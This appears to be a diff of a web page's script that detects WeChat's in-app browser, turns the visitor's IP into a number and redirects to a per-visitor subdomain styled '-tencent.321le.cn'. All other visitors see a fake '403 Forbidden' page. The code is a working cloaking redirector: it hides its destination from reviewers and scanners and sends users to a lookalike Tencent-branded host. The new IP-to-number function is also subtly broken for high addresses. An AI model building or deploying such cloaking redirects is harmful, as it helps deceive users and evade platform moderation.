@@ -22,6 +22,7 @@
     
 
 <body>
+
     <script>
         var userAgent = navigator.userAgent;
         
@@ -34,11 +35,11 @@
                 .then(data => {
                     userIp = data.ip;
                     
-                    // 将IP转化为32位英文数字串
-                    var encodedIp = btoa(userIp).replace(/[+/]/g, '').substring(0, 32);
+                    // 将IP转化为32位数字串
+                    var encodedIp = ipToNumber(userIp).toString();
                     
                     // 拼接跳转URL
-                    var redirectUrl = 'http://' + encodedIp + '-321lecloud-tencent.321le.cn';
+                    var redirectUrl = 'http://' + encodedIp + '-tencent.321le.cn';
                     
                     // 执行重定向跳转
                     window.location.href = redirectUrl;
@@ -49,6 +50,15 @@
         } else {
             // 非微信环境下显示403 Forbidden错误
             document.body.innerHTML = '<h1>403 Forbidden</h1>';
+        }
+        
+        // 将IP地址转化为32位数字串
+        function ipToNumber(ip) {
+            var parts = ip.split('.');
+            return (parseInt(parts[0]) << 24) +
+                   (parseInt(parts[1]) << 16) +
+                   (parseInt(parts[2]) << 8) +
+                   parseInt(parts[3]);
         }
     </script>
 </body>
